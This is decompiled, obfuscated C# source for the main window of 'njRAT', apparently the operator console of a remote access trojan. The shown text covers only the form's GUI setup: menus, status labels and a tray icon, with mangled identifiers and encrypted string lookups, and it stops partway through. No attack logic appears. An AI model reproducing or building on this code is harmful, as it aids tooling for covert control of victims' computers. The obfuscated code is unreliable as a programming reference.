using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using WinMM;

namespace njRAT
{
	// Token: 0x02000038 RID: 56
	[DesignerGenerated]
	public partial class Form1 : Form
	{
		// Token: 0x0600018C RID: 396 RVA: 0x00014530 File Offset: 0x00012730
		public Form1()
		{
			base.Activated += this.\u0002;
			base.Deactivate += this.\u0003;
			base.FormClosing += this.\u0002;
			base.Load += this.\u0005;
			this.isActive = false;
			this.\u000E\u2004 = 0;
			this.\u0002();
		}

		// Token: 0x0600018E RID: 398 RVA: 0x000145EC File Offset: 0x000127EC
		[DebuggerStepThrough]
		private void \u0002()
		{
			this.\u0002 = new Container();
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
			DataGridViewCellStyle dataGridViewCellStyle = new DataGridViewCellStyle();
			DataGridViewCellStyle dataGridViewCellStyle2 = new DataGridViewCellStyle();
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002(new System.Windows.Forms.Timer(this.\u0002));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002(new StatusStrip());
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002(new ToolStripStatusLabel());
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0003(new ToolStripStatusLabel());
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000F(new ToolStripStatusLabel());
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0005(new ToolStripStatusLabel());
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000E(new ToolStripStatusLabel());
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0008(new ToolStripStatusLabel());
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0006(new ToolStripStatusLabel());
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002(new ContextMenuStrip(this.\u0002));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000F\u2001(new ToolStripMenuItem());
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0003\u2001(new ToolStripMenuItem());
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0005\u2001(new ToolStripMenuItem());
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0008\u2001(new ToolStripMenuItem());
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0006\u2001(new ToolStripMenuItem());
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0005\u2000(new ToolStripMenuItem());
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0008\u2000(new ToolStripMenuItem());
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000E\u2001(new ToolStripMenuItem());
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0006\u2000(new ToolStripMenuItem());
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000E\u2000(new ToolStripMenuItem());
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000F\u2000(new ToolStripMenuItem());
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002(new ToolStripMenuItem());
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0003(new ToolStripMenuItem());
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000F(new ToolStripMenuItem());
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002\u2000(new ToolStripMenuItem());
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0005(new ToolStripMenuItem());
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0008(new ToolStripMenuItem());
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0006(new ToolStripMenuItem());
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000E(new ToolStripMenuItem());
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0003\u2000(new ToolStripMenuItem());
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002\u2001(new ToolStripMenuItem());
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002(new ImageList(this.\u0002));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002(new NotifyIcon(this.\u0002));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002(new \u0005\u2001());
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002(new \u0008\u2000());
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0003(new ContextMenuStrip(this.\u0002));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002\u2002(new ToolStripMenuItem());
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0003\u2002(new ToolStripMenuItem());
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0005\u2002(new ToolStripMenuItem());
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().SuspendLayout();
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().SuspendLayout();
			((ISupportInitialize)this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002()).BeginInit();
			((ISupportInitialize)this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002()).BeginInit();
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0003().SuspendLayout();
			this.SuspendLayout();
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().BackColor = Color.Black;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Items.AddRange(new ToolStripItem[]
			{
				this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002(),
				this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0003(),
				this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000F(),
				this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0005(),
				this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000E(),
				this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0008(),
				this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0006()
			});
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().LayoutStyle = ToolStripLayoutStyle.Flow;
			Control control = this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002();
			Point location = new Point(0, 314);
			control.Location = location;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Name = global::\u0006\u2001.\u0002(-1829139389);
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().RenderMode = ToolStripRenderMode.Professional;
			Control control2 = this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002();
			Size size = new Size(862, 19);
			control2.Size = size;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().SizingGrip = false;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().TabIndex = 1;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Text = global::\u0006\u2001.\u0002(-1829139389);
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().ForeColor = Color.Black;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().IsLink = true;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().LinkColor = Color.White;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Name = global::\u0006\u2001.\u0002(-1829139376);
			ToolStripItem toolStripItem = this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002();
			size = new Size(49, 14);
			toolStripItem.Size = size;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Tag = global::\u0006\u2001.\u0002(-1829139276);
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Text = global::\u0006\u2001.\u0002(-1829139316);
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0003().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0003().ForeColor = Color.Black;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0003().IsLink = true;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0003().LinkColor = Color.White;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0003().Name = global::\u0006\u2001.\u0002(-1829139299);
			ToolStripItem toolStripItem2 = this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0003();
			size = new Size(60, 14);
			toolStripItem2.Size = size;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0003().Text = global::\u0006\u2001.\u0002(-1829139231);
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000F().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000F().ForeColor = Color.Black;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000F().IsLink = true;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000F().LinkColor = Color.White;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000F().Name = global::\u0006\u2001.\u0002(-1829139249);
			ToolStripItem toolStripItem3 = this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000F();
			size = new Size(67, 14);
			toolStripItem3.Size = size;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000F().Text = global::\u0006\u2001.\u0002(-1829139245);
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0005().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0005().ForeColor = Color.Black;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0005().IsLink = true;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0005().LinkColor = Color.White;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0005().Name = global::\u0006\u2001.\u0002(-1829141728);
			ToolStripItem toolStripItem4 = this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0005();
			size = new Size(54, 14);
			toolStripItem4.Size = size;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0005().Text = global::\u0006\u2001.\u0002(-1829141756);
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000E().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000E().ForeColor = Color.LightSteelBlue;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000E().Name = global::\u0006\u2001.\u0002(-1829141740);
			ToolStripItem toolStripItem5 = this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000E();
			size = new Size(94, 14);
			toolStripItem5.Size = size;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000E().Text = global::\u0006\u2001.\u0002(-1829141655);
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0008().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0008().ForeColor = Color.LightSteelBlue;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0008().Name = global::\u0006\u2001.\u0002(-1829141645);
			ToolStripItem toolStripItem6 = this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0008();
			size = new Size(95, 14);
			toolStripItem6.Size = size;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0008().Text = global::\u0006\u2001.\u0002(-1829141687);
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0006().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0006().ForeColor = Color.LightSteelBlue;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0006().Name = global::\u0006\u2001.\u0002(-1829141678);
			ToolStripItem toolStripItem7 = this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0006();
			size = new Size(112, 14);
			toolStripItem7.Size = size;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0006().Text = global::\u0006\u2001.\u0002(-1829141592);
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().BackColor = Color.White;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Items.AddRange(new ToolStripItem[]
			{
				this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000F\u2001(),
				this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0003\u2001(),
				this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0005\u2000(),
				this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0008\u2000(),
				this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000E\u2001(),
				this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0006\u2000(),
				this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000E\u2000(),
				this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000F\u2000(),
				this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002(),
				this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002\u2001()
			});
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().Name = global::\u0006\u2001.\u0002(-1829141617);
			Control control3 = this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002();
			size = new Size(167, 224);
			control3.Size = size;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000F\u2001().BackColor = Color.Black;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000F\u2001().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000F\u2001().ForeColor = Color.LightSteelBlue;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000F\u2001().Image = (Image)componentResourceManager.GetObject(global::\u0006\u2001.\u0002(-1829141609));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000F\u2001().Name = global::\u0006\u2001.\u0002(-1829141518);
			ToolStripItem toolStripItem8 = this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000F\u2001();
			size = new Size(166, 22);
			toolStripItem8.Size = size;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000F\u2001().Text = global::\u0006\u2001.\u0002(-1829141549);
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0003\u2001().BackColor = Color.Black;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0003\u2001().DropDownItems.AddRange(new ToolStripItem[]
			{
				this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0005\u2001(),
				this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0008\u2001(),
				this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0006\u2001()
			});
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0003\u2001().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0003\u2001().ForeColor = Color.LightSteelBlue;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0003\u2001().Image = (Image)componentResourceManager.GetObject(global::\u0006\u2001.\u0002(-1829141979));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0003\u2001().Name = global::\u0006\u2001.\u0002(-1829142016);
			ToolStripItem toolStripItem9 = this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0003\u2001();
			size = new Size(166, 22);
			toolStripItem9.Size = size;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0003\u2001().Text = global::\u0006\u2001.\u0002(-1829141919);
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0005\u2001().BackColor = Color.Black;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0005\u2001().ForeColor = Color.LightSteelBlue;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0005\u2001().Image = (Image)componentResourceManager.GetObject(global::\u0006\u2001.\u0002(-1829141902));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0005\u2001().Name = global::\u0006\u2001.\u0002(-1829141845);
			ToolStripItem toolStripItem10 = this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0005\u2001();
			size = new Size(130, 22);
			toolStripItem10.Size = size;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0005\u2001().Text = global::\u0006\u2001.\u0002(-1829141878);
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0008\u2001().BackColor = Color.Black;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0008\u2001().ForeColor = Color.LightSteelBlue;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0008\u2001().Image = (Image)componentResourceManager.GetObject(global::\u0006\u2001.\u0002(-1829141862));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0008\u2001().Name = global::\u0006\u2001.\u0002(-1829141773);
			ToolStripItem toolStripItem11 = this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0008\u2001();
			size = new Size(130, 22);
			toolStripItem11.Size = size;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0008\u2001().Text = global::\u0006\u2001.\u0002(-1829141806);
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0006\u2001().BackColor = Color.Black;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0006\u2001().ForeColor = Color.LightSteelBlue;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0006\u2001().Image = (Image)componentResourceManager.GetObject(global::\u0006\u2001.\u0002(-1829142238));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0006\u2001().Name = global::\u0006\u2001.\u0002(-1829142242);
			ToolStripItem toolStripItem12 = this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0006\u2001();
			size = new Size(130, 22);
			toolStripItem12.Size = size;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0006\u2001().Text = global::\u0006\u2001.\u0002(-1829142176);
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0005\u2000().BackColor = Color.Black;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0005\u2000().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0005\u2000().ForeColor = Color.LightSteelBlue;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0005\u2000().Image = (Image)componentResourceManager.GetObject(global::\u0006\u2001.\u0002(-1829142157));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0005\u2000().Name = global::\u0006\u2001.\u0002(-1829142104);
			ToolStripItem toolStripItem13 = this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0005\u2000();
			size = new Size(166, 22);
			toolStripItem13.Size = size;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0005\u2000().Text = global::\u0006\u2001.\u0002(-1829142141);
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0008\u2000().BackColor = Color.Black;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0008\u2000().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0008\u2000().ForeColor = Color.LightSteelBlue;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0008\u2000().Image = (Image)componentResourceManager.GetObject(global::\u0006\u2001.\u0002(-1829142034));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0008\u2000().Name = global::\u0006\u2001.\u0002(-1829142074);
			ToolStripItem toolStripItem14 = this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0008\u2000();
			size = new Size(166, 22);
			toolStripItem14.Size = size;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0008\u2000().Text = global::\u0006\u2001.\u0002(-1829142492);
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000E\u2001().BackColor = Color.Black;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000E\u2001().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000E\u2001().ForeColor = Color.LightSteelBlue;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000E\u2001().Image = (Image)componentResourceManager.GetObject(global::\u0006\u2001.\u0002(-1829142477));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000E\u2001().Name = global::\u0006\u2001.\u0002(-1829142508);
			ToolStripItem toolStripItem15 = this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000E\u2001();
			size = new Size(166, 22);
			toolStripItem15.Size = size;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000E\u2001().Text = global::\u0006\u2001.\u0002(-1829142405);
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0006\u2000().BackColor = Color.Black;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0006\u2000().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0006\u2000().ForeColor = Color.LightSteelBlue;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0006\u2000().Image = (Image)componentResourceManager.GetObject(global::\u0006\u2001.\u0002(-1829142454));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0006\u2000().Name = global::\u0006\u2001.\u0002(-1829142368);
			ToolStripItem toolStripItem16 = this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0006\u2000();
			size = new Size(166, 22);
			toolStripItem16.Size = size;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0006\u2000().Text = global::\u0006\u2001.\u0002(-1829142372);
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000E\u2000().BackColor = Color.Black;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000E\u2000().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000E\u2000().ForeColor = Color.LightSteelBlue;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000E\u2000().Image = (Image)componentResourceManager.GetObject(global::\u0006\u2001.\u0002(-1829142296));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000E\u2000().Name = global::\u0006\u2001.\u0002(-1829142335);
			ToolStripItem toolStripItem17 = this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000E\u2000();
			size = new Size(166, 22);
			toolStripItem17.Size = size;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000E\u2000().Text = global::\u0006\u2001.\u0002(-1829140704);
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000F\u2000().BackColor = Color.Black;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000F\u2000().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000F\u2000().ForeColor = Color.LightSteelBlue;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000F\u2000().Image = (Image)componentResourceManager.GetObject(global::\u0006\u2001.\u0002(-1829140688));
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000F\u2000().Name = global::\u0006\u2001.\u0002(-1829140630);
			ToolStripItem toolStripItem18 = this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000F\u2000();
			size = new Size(166, 22);
			toolStripItem18.Size = size;
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u000F\u2000().Text = global::\u0006\u2001.\u0002(-1829140662);
			this.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().BackColor = Color.Black;
